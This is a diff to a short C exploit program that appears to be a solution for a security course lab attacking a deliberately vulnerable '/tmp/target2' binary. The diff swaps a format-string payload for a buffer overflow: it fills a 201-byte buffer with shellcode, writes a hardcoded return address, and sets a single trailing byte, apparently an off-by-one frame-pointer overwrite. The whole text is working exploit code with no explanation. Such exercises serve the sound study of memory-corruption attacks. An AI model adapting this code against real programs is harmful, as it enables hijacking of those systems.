@@ -4,14 +4,19 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/tmp/target5"
+#define TARGET "/tmp/target2"
 
 int main(void)
 {
   char *args[3];
   char *env[1];
 
-  char *exploit = "\x44\xfe\xff\xbf%08x.%08x.%08x.%08x.%08x";
+  char exploit[201];
+  memset(exploit, 0xff, 201);
+  exploit[200] = 0x40;
+  memcpy(exploit, shellcode, sizeof(shellcode) - 1);
+  int *ret = (int *)(exploit + 132 + 4);
+  *ret = 0xbffffcbc;
 
   args[0] = TARGET; args[1] = exploit; args[2] = NULL;
   env[0] = NULL;
